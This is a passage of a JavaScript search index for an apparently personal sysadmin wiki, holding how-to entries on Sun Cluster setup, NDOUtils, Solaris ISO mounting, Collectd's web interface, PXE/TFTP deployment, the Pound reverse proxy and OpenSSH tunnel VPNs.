\u003c\u003c\u003c You must configure at least two cluster transport adapters for each node in the cluster. These are the adapters which attach to the private cluster interconnect. What is the name of the first cluster transport adapter? vmxnet0 Type the name of your interface. May be you have to choose between some interfaces if they are detected (like on vmware)\nAdapter \"vmxnet0\" is already in use as a public network adapter. What is the name of the first cluster transport adapter? vmxnet1 Will this be a dedicated cluster transport adapter (yes/no) [yes]? yes All transport adapters support the \"dlpi\" transport type. Ethernet and Infiniband adapters are supported only with the \"dlpi\" transport; however, other adapter types may support other types of transport. For more information on which transports are supported with which adapters, please refer to the scconf_transp_adap family of man pages (scconf_transp_adap_hme(1M), ...). Is \"vmxnet1\" an Ethernet adapter (yes/no) [no]? yes Is \"vmxnet1\" an Infiniband adapter (yes/no) [no]? no The \"dlpi\" transport type will be set for this cluster. Name of the junction to which \"vmxnet1\" is connected [switch1]? Each adapter is cabled to a particular port on a transport junction. And, each port is assigned a name. You can explicitly assign a name to each port. Or, for Ethernet and Infiniband switches, you can choose to allow scinstall to assign a default name for you. The default port name assignment sets the name to the node number of the node hosting the transport adapter at the other end of the cable. For more information regarding port naming requirements, refer to the scconf_transp_jct family of man pages (e.g., scconf_transp_jct_dolphinswitch(1M)). Use the default port name for the \"vmxnet1\" connection (yes/no) [yes]? What is the name of the second cluster transport adapter? vmxnet2 Will this be a dedicated cluster transport adapter (yes/no) [yes]? Name of the junction to which \"vmxnet2\" is connected [switch2]? Use the default port name for the \"vmxnet2\" connection (yes/no) [yes]? Follow step by step and answer for the network card and switch.\n\u003e\u003e\u003e Global Devices File System \u003c\u003c\u003c Each node in the cluster must have a local file system mounted on /global/.devices/node@ before it can successfully participate as a cluster member. Since the \"nodeID\" is not assigned until scinstall is run, scinstall will set this up for you. You must supply the name of either an already-mounted file system or raw disk partition which scinstall can use to create the global devices file system. This file system or partition should be at least 512 MB in size. If an already-mounted file system is used, the file system must be empty. If a raw disk partition is used, a new file system will be created for you. The default is to use /globaldevices. Is it okay to use this default (yes/no) [yes]? yes Choose yes if you want to have GFS activated on your cluster.\n/globaldevices is not a directory or file system mount point. Cannot use \"/globaldevices\". Do you want to select another file system (yes/no) [yes]? yes Do you want to use an already existing file system (yes/no) [yes]? yes What is the name of the file system? global Second Node linkTo see DID local disks:\nscdidadm -l And for all shared and local disks:\nscdidadm -L For the Quorum device (or global device), you have to choose a duplicate device to define it:\nsconf -a -q globaldev=d4 or\nscsetup Note: The global device must be writable (hard drive is the best quorum device)\nTo verify disk group imported in a node:\nvxdg list Then to resynchronize\nOthers stuffs linkResynchronize group linkThis command is for resynchronizing group:\nsconf -c -D name=nfsdg,sync DPM linkThe disk path monitoring is a tool for monitor disks. To show all monitored disks:\nscdpm -p all:all To monitor a partition for a node:\nscdpm -m node:d4 Maintenance linkIf you want to upgrade or do maintenance on a node, you can place it in maintenance mode. All its quorum were deleted. When it will reboot normally, then it will took back its quorum.\nscconf -c -q node=node1 maintstate During a boot, on the OBP:\nok boot –\u003e node integration in the cluster ok boot -x –\u003e don’t enter the node in the cluster (this won’t load cluster kernel modules) To shutdown all node of the cluster:\nscshutdown SVM linkSVM are Solaris Volume Manager, it’s like LVM on Linux. If the raid is sofware, each hard drive get a partition for MetaDB. MetaDB is the SVM informations replicated on each drives.\nIf the MetaDB is corrupted on some drives, and the addition of all your hard drive are:\nTotal disks \u003c 50% = PANIC (reboot) Total disks \u003e= 50% = continue to run but if there is a reboot, it could not start. It must have more than 50% To bypass this limitation of 50%, type this command:\necho \"set md:root_mirror_flag=1\" \u003e\u003e /etc/system Mediators are additional votes in crash case to increase the MetaDB percentage. When a mediator is activated, it ask to other nodes to block their own mediator. So it becomes the golden mediator.\n"
            }
        );
    index.add(
            {
                id:  427 ,
                href: "\/NDOUtils_:_Envoyer_les_%C3%A9tats_en_base_de_donn%C3%A9e\/",
                title: "NDOUtils: Sending States to a Database",
                description: "Guide on configuring NDOUtils to send Nagios monitoring states to a MySQL or PostgreSQL database",
                content: "Introduction linkNDO is an additional module allowing Nagios to write the state of the machines and services to be monitored in a database.\nNDO is made up of two modules: NDOMOD and NDO2DB.\nNDOMOD must be launched on the Nagios server and retrieves the information reported by Nagios to transmit it via TCP (or a Unix socket) to NDO2DB.\nNDO2DB is a daemon that listens on a TCP port (or a Unix socket) and writes the received data to a database (MySQL or PgSQL).\nInstallation linkWe’ll assume that you already have Nagios installed and configured. We need to install NDOUtils:\naptitude install ndoutils ndoutils-mysql With this, we’ll be able to store data in a MySQL database.\nConfiguration linkDefault linkEdit the /etc/default/ndoutils file and check that this value is set to 1:\n... ENABLE_NDOUTILS=1 .. ndo2db.cfg linkConfigure the database for ndo2db. Normally all database information was pre-filled during NDOUtils installation. However, we’ll make a few small adjustments:\n##################################################################### # NDO2DB DAEMON CONFIG FILE # # Last Modified: 10-29-2007 ##################################################################### # USER/GROUP PRIVILIGES # These options determine the user/group that the daemon should run as. # You can specify a number (uid/gid) or a name for either option. ndo2db_user=nagios ndo2db_group=nagios # SOCKET TYPE # This option determines what type of socket the daemon will create # an accept connections from. # Value: # unix = Unix domain socket (default) # tcp = TCP socket #socket_type=unix socket_type=tcp # SOCKET NAME # This option determines the name and path of the UNIX domain # socket that the daemon will create and accept connections from. # This option is only valid if the socket type specified above # is \"unix\". socket_name=/var/cache/nagios3/ndo.sock # TCP PORT # This option determines what port the daemon will listen for # connections on. This option is only vlaid if the socket type # specified above is \"tcp\". tcp_port=5668 # DATABASE SERVER TYPE # This option determines what type of DB server the daemon should # connect to. # Values: # mysql = MySQL # pgsql = PostgreSQL db_servertype=mysql # DATABASE HOST # This option specifies what host the DB server is running on. db_host=localhost # DATABASE PORT # This option specifies the port that the DB server is running on. # Values: # 3306 = Default MySQL port #\t5432 = Default PostgreSQL port db_port=3306 # DATABASE NAME # This option specifies the name of the database that should be used. db_name=ndoutils # DATABASE TABLE PREFIX # Determines the prefix (if any) that should be prepended to table names. # If you modify the table prefix, you'll need to modify the SQL script for # creating the database! db_prefix=nagios_ # DATABASE USERNAME/PASSWORD # This is the username/password that will be used to authenticate to the DB. # The user needs at least SELECT, INSERT, UPDATE, and DELETE privileges on # the database. db_user=ndoutils db_pass=password ## TABLE TRIMMING OPTIONS # Several database tables containing Nagios event data can become quite large # over time. Most admins will want to trim these tables and keep only a # certain amount of data in them. The options below are used to specify the # age (in MINUTES) that data should be allowd to remain in various tables # before it is deleted. Using a value of zero (0) for any value means that # that particular table should NOT be automatically trimmed. # Keep timed events for 24 hours max_timedevents_age=1440 # Keep system commands for 1 week max_systemcommands_age=10080 # Keep service checks for 1 week max_servicechecks_age=10080 # Keep host checks for 1 week max_hostchecks_age=10080 # Keep event handlers for 31 days max_eventhandlers_age=44640 # DEBUG LEVEL # This option determines how much (if any) debugging information will # be written to the debug file. OR values together to log multiple # types of information. # Values: -1 = Everything # 0 = Nothing # 1 = Process info #\t2 = SQL queries debug_level=0 # DEBUG VERBOSITY # This option determines how verbose the debug log out will be. # Values: 0 = Brief output # 1 = More detailed # 2 = Very detailed debug_verbosity=0 # DEBUG FILE # This option determines where the daemon should write debugging information. debug_file=@localstatedir@/ndo2db.debug # MAX DEBUG FILE SIZE # This option determines the maximum size (in bytes) of the debug file. If # the file grows larger than this size, it will be renamed with a .old # extension. If a file already exists with a .old extension it will # automatically be deleted. This helps ensure your disk space usage doesn't # get out of control when debugging. max_debug_file_size=1000000 ndomod.cfg linkThen for NDOMOD:\n##################################################################### # NDOMOD CONFIG FILE # # Last Modified: 09-05-2007 ##################################################################### # INSTANCE NAME # This option identifies the \"name\" associated with this particular # instance of Nagios and is used to seperate data coming from multiple # instances. Defaults to 'default' (without quotes). instance_name=default # OUTPUT TYPE # This option determines what type of output sink the NDO NEB module # should use for data output. Valid options include: # file = standard text file # tcpsocket = TCP socket # unixsocket = UNIX domain socket (default) #output_type=file output_type=tcpsocket #output_type=unixsocket # OUTPUT # This option determines the name and path of the file or UNIX domain # socket to which output will be sent if the output type option specified # above is \"file\" or \"unixsocket\", respectively. If the output type # option is \"tcpsocket\", this option is used to specify the IP address # of fully qualified domain name of the host that the module should # connect to for sending output. #output=/var/cache/nagios2/ndo.dat output=127.0.0.1 #output=/var/cache/nagios3/ndo.sock # TCP PORT # This option determines what port the module will connect to in # order to send output. This option is only vlaid if the output type # option specified above is \"tcpsocket\". tcp_port=5668 # OUTPUT BUFFER # This option determines the size of the output buffer, which will help # prevent data from getting lost if there is a temporary disconnect from # the data sink. The number of items specified here is the number of # lines (each of variable size) of output that will be buffered. output_buffer_items=5000 # BUFFER FILE # This option is used to specify a file which will be used to store the # contents of buffered data which could not be sent to the NDO2DB daemon # before Nagios shuts down. Prior to shutting down, the NDO NEB module # will write all buffered data to this file for later processing. When # Nagios (re)starts, the NDO NEB module will read the contents of this # file and send it to the NDO2DB daemon for processing. buffer_file=/var/cache/nagios3/ndomod.tmp # FILE ROTATION INTERVAL # This option determines how often (in seconds) the output file is # rotated by Nagios. File rotation is handled by Nagios by executing # the command defined by the file_rotation_command option. This # option has no effect if the output_type option is a socket. file_rotation_interval=14400 # FILE ROTATION COMMAND # This option specified the command (as defined in Nagios) that is # used to rotate the output file at the interval specified by the # file_rotation_interval option. This option has no effect if the # output_type option is a socket. # # See the file 'misccommands.cfg' for an example command definition # that you can use to rotate the log file. #file_rotation_command=rotate_ndo_log # FILE ROTATION TIMEOUT # This option specified the maximum number of seconds that the file # rotation command should be allowed to run before being prematurely # terminated. file_rotation_timeout=60 # RECONNECT INTERVAL # This option determines how often (in seconds) that the NDO NEB # module will attempt to re-connect to the output file or socket if # a connection to it is lost. reconnect_interval=15 # RECONNECT WARNING INTERVAL # This option determines how often (in seconds) a warning message will # be logged to the Nagios log file if a connection to the output file # or socket cannot be re-established. reconnect_warning_interval=15 #reconnect_warning_interval=900 # DATA PROCESSING OPTION # This option determines what data the NDO NEB module will process. # Do not mess with this option unless you know what you're doing!!!! # Read the source code (include/ndbxtmod.h) to determine what values # to use here. Values from source code should be OR'ed to get the # value to use here. A value of -1 will cause all data to be processed. # Read the source code (include/ndomod.h) and look for \"NDOMOD_PROCESS_\" # to determine what values to use here. Values from source code should # be OR'ed to get the value to use here. A value of -1 will cause all # data to be processed. data_processing_options=-1 # CONFIG OUTPUT OPTION # This option determines what types of configuration data the NDO # NEB module will dump from Nagios. Values can be OR'ed together. # Values: # 0 = Don't dump any configuration information # 1 = Dump only original config (from config files) # 2 = Dump config only after retained information has been restored # 3 = Dump both original and retained configuration config_output_options=2 nagios.cfg linkFinally, we’ll edit the nagios.cfg file:\nevent_broker_options=-1 broker_module=/usr/lib/ndoutils/ndomod-mysql-3x.o config_file=/etc/nagios3/ndomod.cfg Restart linkTo finish, you need to restart the ndoutils service. Personally, I’ve had too many annoying errors in the syslog like:\nnagios3: ndomod: Still unable to connect to data sink. 1325744 items lost, 5000 queued items to flush. Actually, after rebooting the machine, everything started working correctly (the database was populated).\nResources linkhttp://blog.nicolargo.com/2009/02/pour-en-finir-avec-ndo.html\n"
            }
        );
    index.add(
            {
                id:  428 ,
                href: "\/D%C3%A9sactiver_la_mise_en_veille_de_l%27%C3%A9cran_sur_Debian\/",
                title: "Disable Screen Standby on Debian",
                description: "How to disable screen standby and screen locking on Debian systems.",
                content: "Introduction linkThis is a simple but sometimes useful feature. By default, Debian turns the screen black after 30 minutes and locks the screen after 60 minutes.\nIt’s possible to disable all of these features.\nInstructions linkEdit the /etc/console-tools/config file and change these lines:\nBLANK_TIME=0 POWERDOWN_TIME=0 Reboot and you’re all set! :-)\n"
            }
        );
    index.add(
            {
                id:  429 ,
                href: "\/Monter_une_image_ISO_sous_Solaris\/",
                title: "Mount an ISO image on Solaris",
                description: "How to mount an ISO image on Solaris using lofiadm and mount commands.",
                content: "Introduction linkMany software packages can be downloaded in the form of an ISO image. Rather than burning the image to a CD-ROM to access its contents, it is easy to mount the image directly into the filesystem using the lofiadm and mount commands.\nUsage linkGiven an ISO image in /export/temp/software.iso, a loopback file device (/dev/lofi/1) is created with the following command:\nlofiadm -a /export/temp/software.iso /dev/lofi/1 The lofi device creates a block device version of a file. This block device can be mounted to /mnt with the following command:\nmount -F hsfs -o ro /dev/lofi/1 /mnt These commands can be combined into a single command:\nmount -F hsfs -o ro `lofiadm -a /export/temp/software.iso` /mnt Resources linkhttps://www.tech-recipes.com/rx/218/mount-an-iso-image-on-a-solaris-filesystem-with-lofiadm/\n"
            }
        );
    index.add(
            {
                id:  430 ,
                href: "\/Collection3_:_Une_interface_web_pour_Collectd\/",
                title: "Collection3: A Web Interface for Collectd",
                description: "How to install and configure Collection3, a web interface for Collectd that enables viewing gathered statistics through a browser",
                content: "Introduction linkCollectd is great, but with a functional web interface, it’s even better. We’re going to see how to install Collection3, an interface that isn’t necessarily pretty, but is very functional.\nInstallation linkYou must have a web server like Apache and CGI enabled. Here’s what you need to install if you choose Apache:\naptitude install apache2 librrds-perl libconfig-general-perl libhtml-parser-perl libregexp-common-perl I haven’t mentioned it, but it’s obvious that you need Collectd installed.\nConfiguration linkWe’ll configure the Apache2 part:\nScriptAlias /collectd/bin/ /usr/share/doc/collectd/examples/collection3/bin/ Alias /collectd/ /usr/share/doc/collectd/examples/collection3/ AddHandler cgi-script .cgi DirectoryIndex bin/index.cgi Options +ExecCGI Order Allow,Deny Allow from all Then restart Apache2 or reload it.\nYou can now access your data via the following address: http://collectd-server/collectd/\nResources link http://collectd.org/wiki/index.php/Collection3 http://collectd.org/wiki/index.php/List_of_front-ends "
            }
        );
    index.add(
            {
                id:  431 ,
                href: "\/DrawIt_:_Une_extension_VIM_pour_faire_des_diagrammes_en_ASCII\/",
                title: "DrawIt: A VIM Extension for Creating ASCII Diagrams",
                description: "Guide on how to install and use DrawIt, a VIM extension that allows creating ASCII diagrams directly in the editor.",
                content: " Introduction linkDrawIt allows you to create ASCII diagrams. It’s very practical and avoids the hassle of using unnecessary tools.\nIf you want to convert your ASCII diagrams to images, use Ditaa.\nInstallation linkInstallation is quite simple as there is a small installer for vim:\ncd ~ wget -O DrawIt.vba.tgz \"http://www.vim.org/scripts/download_script.php?src_id=8798\" gzip -d DrawIt.vba.tgz mv DrawIt.vba.tar Drawit.vba vim Drawit.vba :so % :q And that’s it.\nUtilization linkUsing it is also quite straightforward. I’m just copying and pasting the documentation as it’s clear enough.\nBasic commands:\nActivate draw: \\di Deactivate: \\ds Key Description move and draw left move and draw right, inserting lines/space as needed move and draw up, inserting lines/space as needed move and draw down, inserting lines/space as needed move left move right, inserting lines/space as needed move up, inserting lines/space as needed move down, inserting lines/space as needed toggle into and out of erase mode \u003e draw -\u003e arrow \u003c draw \u003c- arrow ^ draw ^ arrow v draw v arrow replace with a \\, move down and right, and insert a \\ replace with a /, move down and left, and insert a / replace with a /, move up and right, and insert a / replace with a \\, move up and left, and insert a \\ \\\u003e draw fat -\u003e arrow \\\u003c draw fat \u003c- arrow \\^ draw fat ^ arrow \\v draw fat v arrow \\a draw arrow based on corners of visual-block \\b draw box using visual-block selected region \\e draw an ellipse inside visual-block \\f fill a figure with some character \\h create a canvas for \\a \\b \\e \\l \\l draw line based on corners of visual block \\s adds spaces to canvas select visual block drag and draw with current brush (register) \\ra … \\rz replace text with given brush/register \\pa … like \\ra … \\rz, except that blanks are considered to be transparent "
            }
        );
    index.add(
            {
                id:  432 ,
                href: "\/TFTP_:_PXE_Serveur,_d%C3%A9ploiement_d%27OS_sous_Linux\/",
                title: "TFTP: PXE Server, OS Deployment under Linux",
                description: "Guide to set up a PXE server for OS deployment using TFTP under Linux",
                content: "Introduction linkPXE boot (Pre-boot eXecution Environment) allows a workstation to boot from the network an operating system that is stored on a server.\nIt also allows automatic and remote installation of servers with various operating systems.\nTo enable PXE, you first need to configure it in the BIOS. The option is frequently found in a menu related to the network card.\nPXE booting is performed in several steps:\nSearch for an IP address on a DHCP server as well as the file to boot Download the boot file from a Trivial FTP server Execute the boot file It should be noted that the size of the boot file does not allow for directly booting a Linux kernel, for example, but requires that the boot software download and execute it itself.\nPrerequisites linkThe prerequisites are quite simple; you just need a DHCP server that is able to boot on PXE. We will see here the configuration of this DHCP server so that it accepts network booting.\nInstallation linkTo install the PXE server:\napt-get install tftpd-hpa syslinux Configuration linktftpd-hpa linkWe will edit the file /etc/default/tftpd-hpa to replace the value of RUN_DAEMON:\nRUN_DAEMON=\"yes\" Inetd linkWe disable the tsize of tftp-hpa which limits the size of files to be downloaded. For this, add a line in /etc/inetd.conf and check that another one is commented out:\ntftp dgram udp wait root /usr/sbin/in.tftpd /usr/sbin/in.tftpd -s /var/lib/tftpboot # tftp dgram udp wait nobody /usr/sbin/tcpd /usr/sbin/in.tftpd -r blksize /tftpboot Once done, we will restart inetd and tftpd:\n/etc/init.d/inetd restart /etc/init.d/tftpd-hpa start To verify that everything is working:\n$ netstat -uap | grep tftp udp 0 0 *:tftp *:* 30265/in.tftpd If the line above appears, everything went well :-)\nIptables linkHere’s the nice line to add to iptables to allow tftp:\niptables -A INPUT -s 10.1.1.0/255.255.255.0 -p udp -j ACCEPT DHCP under Linux linkIf your DHCP is under Linux, edit the /etc/dhcp3/dhcpd.conf file and add these lines in your subnet:\nsubnet 192.168.0.0 netmask 255.255.255.0 { ... filename \"pxelinux.0\"; next-server 192.168.1.254; ... } Next-server is to specify the IP address of the PXE server.\nThen restart your DHCP server:\n/etc/init.d/dhcp3 restart DHCP under Windows linkIf your DHCP is under Windows, in your DHCP configuration (general or not), add the address of the TFTP server.\nBoot loader linkNow, we must prepare and organize our TFTP server:\ncd /var/lib/tftpboot mkdir pxelinux.cfg os-installer touch boot.txt cp /usr/lib/syslinux/{pxelinux.0,menu.c32} . We have inserted pxelinux.0, which is essential for booting our OSes, and menu.c32, which provides a basic but practical menu when we have our OSes installed.\nLet’s configure the global configuration of the server. Create and edit the file pxelinux.cfg/default to insert this:\nPROMPT 1 DISPLAY boot.txt F1 boot-screens/f1.txt F2 boot-screens/f2.txt F3 boot-screens/f3.txt F4 boot-screens/f4.txt F5 boot-screens/f5.txt F6 boot-screens/f6.txt F7 boot-screens/f7.txt F8 boot-screens/f8.txt F9 boot-screens/f9.txt F0 boot-screens/f10.txt # On définit ce qui sera lancer par defaut lors du boot, à savoir le menu graphique choisi DEFAULT menu.c32 NOESCAPE 1 # On choisi un titre pour l'écran d'arrivé MENU TITLE -=[ TFTP Server - OS Installer ]=- # Il y a un boot automatique au bout de 20 secondes TIMEOUT 200 # Le boot automatique s'effectue sur le disque dur en locale LABEL Local Hard Drive Boot localboot 0 -- The basic configuration is now ready. We only need to add operating systems.\nSetting up Operating Systems linkLet’s see how to set up different types of operating systems. Before continuing, go to this folder:\ncd os-installer Debian linkLet’s create what we need, that is, a folder, and then insert the kernel. We’ll do both the 32-bit and 64-bit versions:\nmkdir -p debian-installer/{x64,x86} For the 32-bit version:\ncd debian-installer/x86 wget http://ftp.debian.org/dists/stable/main/installer-i386/current/images/netboot/debian-installer/i386/initrd.gz \\ http://ftp.debian.org/dists/stable/main/installer-i386/current/images/netboot/debian-installer/i386/linux For the 64-bit version:\ncd debian-installer/x64 wget http://ftp.debian.org/dists/stable/main/installer-amd64/current/images/netboot/debian-installer/amd64/initrd.gz \\ http://ftp.debian.org/dists/stable/main/installer-amd64/current/images/netboot/debian-installer/amd64/linux Then add these lines (depending on the architecture you have chosen) in the file /var/lib/tftpboot/pxelinux.cfg/default:\nLABEL x64 - Debian kernel os-installer/debian-installer/x86/linux append vga=791 priority=low initrd=os-installer/debian-installer/x86/initrd.gz -- LABEL x86 - Debian kernel os-installer/debian-installer/x64/linux append vga=791 priority=low initrd=os-installer/debian-installer/x64/initrd.gz -- vga=791: loads 1024*768 resolution priority=low: loads Debian expert mode Note: To automate installations, follow this link: Automate a Debian installation.\nMemtest86+ linkAt the time of writing, the latest version is 1.70. So I’ll use this for my example:\nmkdir -p memtest86 Let’s download this version (we’ll take the bootable binary):\ncd memtest86 wget http://www.memtest.org/download/1.70/memtest86+-1.70.bin.gz gzip -d http://www.memtest.org/download/1.70/memtest86+-1.70.bin.gz Then a small subtlety, we need to rename and remove the .bin for it to work:\nmv memtest86+-1.70{,.bin} Then add these lines (depending on the architecture you have chosen) in the file /var/lib/tftpboot/pxelinux.cfg/default:\nLABEL Memtest86+ (RAM Testing Program) kernel os-installer/memtest/memtest86+-1.70 OpenBSD linkAgain, we’ll do what’s necessary to be able to launch OpenBSD in 32-bit and 64-bit versions:\nmkdir -p openbsd-installer/{x64,x86} For the 32-bit version:\ncd openbsd-installer/x86 wget http://ftp.arcane-networks.fr/pub/OpenBSD/4.1/i386/floppy41.fs For the 64-bit version:\ncd openbsd-installer/x64 wget http://ftp.arcane-networks.fr/pub/OpenBSD/4.1/amd64/floppy41.fs We’re using the floppy versions here and not the CD versions because we’ll be using a new module called memdisk that can load an ISO but only smaller than the size of a floppy disk. So copy this module:\ncp /usr/lib/syslinux/memdisk /var/lib/tftpboot/ Then add these lines (depending on the architecture you have chosen) in the file /var/lib/tftpboot/pxelinux.cfg/default:\nLABEL x64 - OpenBSD 4.1 kernel memdisk append initrd=x64/openbsd-installer/floppy41.fs -- LABEL x86 - OpenBSD 4.1 kernel memdisk append initrd=x86/openbsd-installer/floppy41.fs -- Red Hat linkRed Hat is a bit special because we’ll need to create a DVD, then copy it to insert the kernel. We’ll do the 32-bit and 64-bit versions:\nmkdir -p redhat-installer/{x64,x86} Create the DVD, then copy it to the proper directory according to your version (32 or 64 bits).\nFor the 32-bit version:\ncd redhat-installer/x86 cp -Rf votre_dvd/* votre_dvd/.* . For the 64-bit version:\ncd redhat-installer/x64 cp -Rf votre_dvd/* votre_dvd/.* . Then add these lines (depending on the architecture you have chosen) in the file /var/lib/tftpboot/pxelinux.cfg/default:\nLABEL x64 - Red Hat kernel os-installer/redhat-installer/x86/linux append vga=791 priority=low initrd=os-installer/redhat-installer/x86/initrd.gz -- LABEL x86 - Red Hat kernel os-installer/redhat-installer/x64/linux append vga=791 priority=low initrd=os-installer/redhat-installer/x64/initrd.gz -- vga=791: loads 1024*768 resolution Password Protection linkThe SYSLINUX archive contains an executable called sha1pass (it’s a Perl script) that generates passwords in the correct format. To use it under Debian, you need the appropriate Perl module:\napt-get install libdigest-sha1-perl Then run the command with the password as a parameter and it will give us the string to paste into the configuration file. For example, to protect Ghost:\nLABEL ghost MENU LABEL Ghost MENU PASSWD $4$jfoBirJg$rSDbzznCZtmJAES9RH/lC92/3Rs$ kernel memdisk append initrd=ghost/ghost288.IMA Resources link TFTP Documentation on Ubuntu TFTP Documentation on Debian Start without a Disk with PXE, Grub and NFS Configuration and Installation via Serial Port of OpenBSD on Soekris Boot BSDs with PXElinux Setting up a PXE and Solving its Problems "
            }
        );
    index.add(
            {
                id:  433 ,
                href: "\/Pound_:_Installation_et_Configuration_d\u0027un_Reverse_Proxy\/",
                title: "Pound: Installation and Configuration of a Reverse Proxy",
                description: "A guide to installing and configuring Pound as a reverse proxy and load balancer for web servers",
                content: " Introduction linkA reverse proxy is a type of proxy server, usually placed in front of web servers. It differs in its usage from traditional proxy servers.\nThe reverse proxy is implemented on the server side of the Internet. Web users go through it to access applications on internal servers. This technique allows, among other things, to protect a web server from attacks from outside.\nThis technology is used in application security solutions.\nThere are several recognized applications for reverse proxies:\nSecurity: The additional layer provided by reverse proxies can bring additional security. Programmable URL rewriting allows masking and controlling, for example, the architecture of an internal website. But this architecture mainly allows filtering access to web resources from a single point. SSL Acceleration: The reverse proxy can be used as an “SSL terminator,” for example, through dedicated hardware. Load Balancing: The reverse proxy can distribute the load of a single site across multiple web application servers. Depending on its configuration, URL rewriting work will therefore be necessary. Cache: The reverse proxy can offload web servers from the load of static pages/objects (HTML pages, images) by managing a local cache. The load on web servers is thus generally reduced. Compression: The reverse proxy can optimize the compression of site content. After some research, it appears that Pound is one of the best solutions for reverse proxying. You can also do it with Apache, Lighttpd, Nginx… But apparently, Pound stands out because:\nIt is lightweight and efficient (works very well with over 600 connections/sec) Configuration can be easily evolved to do load balancing It is capable of managing sessions Installation linkTo install it, it’s simple:\napt-get install pound Configuration linkDefault linkConfigure /etc/default/pound if you want it to start automatically:\nstartup=1 Basic Reverse Proxy linkHere, I have an Apache running locally on port 8080 and I have Pound listening on port 80:\n## Minimal sample pound.cfg ## ## see pound(8) for details ###################################################################### ## global options: User \"www-data\" Group \"www-data\" #RootJail \"/chroot/pound\" ## Logging: (goes to syslog by default) ## 0 no logging ## 1 normal ## 2 extended ## 3 Apache-style (common log format) LogLevel 1 ## check backend every X secs: Alive 30 ## use hardware-accelleration card supported by openssl(1): #SSLEngine \"\" # poundctl control socket Control \"/var/run/pound/poundctl.socket\" ###################################################################### ## listen, redirect and ... to: ## redirect all requests on port 8080 (\"ListenHTTP\") to the local webserver (see \"Service\" below): ListenHTTP Address 10.101.0.39 Port 80 ## allow PUT and DELETE also (by default only GET, POST and HEAD)?: xHTTP 0 Service BackEnd Address 127.0.0.1 Port 8080 End End End Basic Load Balancing linkFor a configuration, we’ll try a redirection with IP or VirtualHost:\nListenHTTP Address 192.168.0.200 Port 80 Service HeadRequire \"Host: .*www.deimos.fr.*\" BackEnd Address 192.168.0.1 Port 80 End End Service HeadRequire \"Host: .*www.mavro.fr.*\" BackEnd Address 192.168.0.2 Port 80 End End End Here, our server listens on port 80 of IP 192.168.0.200. If the VirtualHost deimos.fr is used, there will be a redirection to IP 192.168.0.1:80. Otherwise, if it’s mavro.fr, the redirection will be to address 192.168.0.2:80.\nAs you can see, it’s quite simple.\nNote: The developer of Pound does not recommend using VirtualHosts and suggests letting the lower layer handle it.\nImportant: Be aware that it is impossible to do VirtualHost with HTTPS. This is due to a limitation of the protocol and not specific to Pound.\nResources linkhttp://www.apsis.ch/pound/index_html\nhttp://www.cyberciti.biz/faq/linux-http-https-reverse-proxy-load-balancer\n"
            }
        );
    index.add(
            {
                id:  434 ,
                href: "\/OpenSSH_:_Tunneling_VPN\/",
                title: "OpenSSH : Tunneling VPN",
                description: "Guide to setting up OpenSSH tunneling VPN, including server and client configuration for creating secure VPN connections.",
                content: "Introduction linkSince version 4.3 of OpenSSH, the option to create IP tunnels has been added.\nFirst, you need to check the OpenSSH version on both the server and client.\nssh -v You need root privileges on both machines. There are operations to perform, both at the configuration and network levels.\nConfiguration linkServer linkOpenBSD linkThe first thing to do is to tell OpenSSH to authorize tunnels by adding this directive:\n# Enable layer-3 tunneling. Change the value to 'ethernet' for layer-2 tunneling PermitTunnel point-to-point We need to ensure that forwarding is activated:\nsysctl net.inet.ip.forwarding=1 And will be activated at reboot:\nnet.inet.ip.forwarding=1 Let’s create a tun interface:\nifconfig tun0 create ifconfig tun0 10.0.0.1 10.0.0.2 netmask 0xfffffffc And again, make the configuration permanent:\n10.0.0.1 10.0.0.2 netmask 0xfffffffc Now we can restart SSH:\npkill -HUP sshd ; /usr/sbin/sshd You also need to disable privilege separation, or adjust permissions on /dev/tun. For simplicity, I’ve added:\nUsePrivilegeSeparation no Another solution is to grant read-write permissions to a specific group on /dev/tun, which is much simpler and safer.\nchmod :mygroup /dev/tun And of course, be in that group.\nYou then need to load the tun module:\nmodprobe tun And add it to /etc/modprobe.preload for loading at next boot:\necho tun \u003e\u003e /etc/modprobe.preload Client linkOn the client side, we also need to add this directive but in the /etc/ssh/ssh_config file:\n# Enable layer-3 tunneling. Change the value to 'ethernet' for layer-2 tunneling PermitTunnel point-to-point Edit the /etc/network/interfaces file and add this interface:\niface tun0 inet static pre-up ssh -S /var/run/ssh-myvpn-tunnel-control -M -f -w 0:0 5.6.7.8 true pre-up sleep 5 address 10.254.254.2 pointopoint 10.254.254.1 netmask 255.255.255.252 up route add -net 10.99.99.0 netmask 255.255.255.0 gw 10.254.254.1 tun0 post-down ssh -S /var/run/ssh-myvpn-tunnel-control -O exit 5.6.7.8 You only need permissions on /dev/tun, so either run as root or have write permission on /dev/tun, as mentioned above, then do (where client is the server):\nssh -w any:any client You can look at the -f and -N options to avoid launching a shell on the remote machine. And of course, the usual options still work (key, tunnel, master/slave).\nThen, as root, you can change the IP of the new tun0 interface on the server:\nifconfig tun0 10.0.0.1 On FreeBSD:\nifconfig tun100 inet 10.0.0.1 10.0.0.2 netmask 255.255.255.255 And do the same on the client:\nifconfig tun0 10.0.0.2 or\nifconfig tun100 inet 10.0.0.2 10.0.0.1 netmask 255.255.255.255 Finally, you can now test the ping from the client:\nping 10.0.0.1 The rest is normal interface configuration. You can add routes, a firewall, anything.\nHowever, you should know that TCP connections over TCP (as is the case with SSH) are not recommended, due to the nature of TCP.\nFAQ linkConnection closed by … linkThis is generally due to the server struggling. Check that it has the correct DNS settings and that in the configuration (/etc/ssh/sshd_config) the LoginGraceTime value is high enough.\nCannot fork into background without a command to execute linkYou may encounter this error message:\nCannot fork into background without a command to execute Failed to bring up tun1. To resolve this issue, add the -N option to the SSH command.\nResources linkDocumentation on SSH VPN\nhttp://www.kernel-panic.it/openbsd/vpn/vpn5.html\nhttp://www.debian-administration.org/article/Setting_up_a_Layer_3_tunneling_VPN_with_using_OpenSSH\n"
            }
        );
    index.add(
            {
                id:  435 ,
                href: "\/Conversions_videos\/",
                title: "Video Conversions",
                description: "Guide on how to convert videos between different formats using mencoder and ffmpeg on Linux",
